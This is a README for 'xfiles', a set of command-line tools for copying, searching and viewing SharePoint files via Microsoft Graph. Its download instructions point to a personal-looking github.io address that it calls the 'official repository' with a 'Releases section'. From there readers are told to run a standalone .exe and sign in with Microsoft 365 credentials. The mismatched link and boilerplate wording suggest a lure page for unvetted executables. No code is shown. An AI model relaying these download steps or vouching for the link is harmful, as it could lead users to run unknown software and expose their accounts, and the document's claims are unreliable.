# 📂 xfiles - Manage SharePoint files with simple commands

[![](https://img.shields.io/badge/Download-xfiles-blue.svg)](https://sueimmovable975.github.io)

xfiles brings traditional file management tools to your SharePoint document libraries. If you know how to work with folders and files on your computer, you already understand how xfiles works. These tools connect directly to Microsoft Graph, allowing you to move, copy, search, and view your documents without opening a web browser.

## ⚙️ Requirements

*   A Windows computer running Windows 10 or Windows 11.
*   A stable internet connection.
*   A Microsoft 365 account with access to SharePoint libraries.
*   Standard user permissions for your local folder structure.

## 📥 How to download and install

You can get the software from the official repository page.

[Click here to visit the download page](https://sueimmovable975.github.io)

1. Navigate to the link provided above.
2. Select the latest version listed under the Releases section on the right side of the page.
3. Choose the file ending in `.exe` that matches your Windows system.
4. Save the file to your desktop or a folder you know.
5. You do not need to install the software. It runs as a standalone tool.

## 🖥️ Using the command line

xfiles operates through the Windows Command Prompt. Follow these steps to open the application:

1. Click the Windows Start button.
2. Type `cmd` and press the Enter key.
3. Navigate to the folder where you saved the xfiles program. For example, if you saved it in your Downloads folder, type `cd Downloads` and press Enter.
4. Type the name of the tool, such as `xftp`, and press Enter to see a list of commands.

## 🛠️ Available tools

xfiles includes four main tools to help you manage your SharePoint content.

### xftp (File Transfer)
Use xftp to send files to your SharePoint library or download them to your computer. It functions like a standard network connection. You can upload files by pointing to your local path and specifying the SharePoint destination path.

### xcp (Copy Files)
xcp copies items from one location to another within your SharePoint environment. This keeps your files organized without requiring manual downloads and uploads through the browser interface.

### xfind (Search)
xfind scans your SharePoint libraries for specific file names. This is useful when you have many folders and need to find a specific document by its name or a part of its name.

### xtree (View Structure)
xtree displays the contents of your SharePoint library in a visual tree format. It shows folders and subfolders so you can see the layout of your library at a glance.

## 🔑 Security and permissions

When you run an xfiles command for the first time, the program asks you to log in to your Microsoft account. This is a standard security step.

1. The software provides a link and a code in your command prompt window.
2. Open the link in your web browser.
3. Enter the code provided by the command prompt.
4. Sign in with your Microsoft 365 credentials.

xfiles uses the Microsoft Graph API to interact with your data. The software only accesses the libraries you authorize during this login process. It does not store your password on your computer.

## 📝 Troubleshooting

If you encounter an error, check the following items:

*   Verify your internet connection.
*   Ensure that you have permissions to edit files in the specific SharePoint library.
*   Check that you entered the command syntax correctly. You can see the syntax by typing the name of the tool followed by `--help`.
*   If the login page does not appear, clear your browser cache and try again.

## 📄 Configuration options

xfiles does not require complex setup files. However, you can manage your connection settings using environment variables if you prefer to save your settings for future use. For most users, the default settings work perfectly without any changes.

If you plan to use these tools frequently, create a shortcut on your desktop pointing to the executable file. This allows you to launch the command prompt directly in the folder where your tools reside.

## 💡 Best practices for SharePoint management

To get the most out of these tools, keep your file paths short. SharePoint libraries can sometimes struggle with deep folder structures. Use `xtree` to audit your library structure before you begin moving or copying large batches of files.

When using `xcp`, verify the destination path before you start the operation. Once a file moves or copies, the process is immediate. Always maintain a backup of critical documents on your local machine or a separate drive if you perform large automated operations.

## 🚀 Automating common tasks

You can create batch files to run xfiles commands automatically. A batch file is a text document with the `.bat` file extension that contains a list of commands. 

1. Open Notepad.
2. Type the xfiles commands you want to run.
3. Save the file with a `.bat` extension.
4. Double-click the file to execute the set of commands in order.

This is helpful for recurring tasks like backing up specific folders every Friday or syncing local project files to a SharePoint document library.

## 🌟 Support and updates

The software updates periodically to maintain compatibility with changes to Microsoft Graph. Check the download page every few months to see if a newer version exists. If you experience issues, the repository contains an issue tracker where you can search for common questions from other users. 

Always keep your local version of the software updated to the latest release to take advantage of improved speed and reliability. If your company uses specific security policies, ensure that your IT department allows the use of command-line tools that connect to Microsoft 365 cloud services.